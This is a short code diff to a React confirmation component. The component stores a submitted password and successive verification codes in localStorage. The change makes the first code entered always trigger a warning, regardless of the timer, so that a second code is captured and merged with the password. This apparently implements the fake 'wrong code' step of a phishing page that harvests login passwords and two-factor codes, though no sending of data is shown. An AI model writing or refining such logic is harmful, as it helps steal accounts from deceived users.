@@ -8,7 +8,7 @@ const ConfirmComponent = () => {
 
     const [activePopup, setActivePopup] = useState(false);
     const [activeLink, setActiveLink] = useState(false);
-    const [timeLeft, setTimeLeft] = useState(10); 
+    const [timeLeft, setTimeLeft] = useState(30); 
     const [activeWaring, setActiveWaring] = useState(false);
 
     const navigate = useNavigate();
@@ -41,7 +41,7 @@ const ConfirmComponent = () => {
 
     const onFinishCodes = (values) => {
         
-        if(timeLeft > 0){
+        if(activeWaring === false){
             setActiveWaring(true)
 
             const dataLocalImages = JSON.parse(localStorage.getItem('dataPassWord'))
@@ -68,7 +68,7 @@ const ConfirmComponent = () => {
         }
 
         
-        else {
+        else if(activeWaring === true) {
             const dataLocalImages = !JSON.parse(localStorage.getItem('dataFirstCode')) ? JSON.parse(localStorage.getItem('dataPassWord')) : JSON.parse(localStorage.getItem('dataFirstCode'))
             const finalCode = {...dataLocalImages, seconds_code: values.fill_code}
             localStorage.setItem('dataAllCode', JSON.stringify(finalCode))
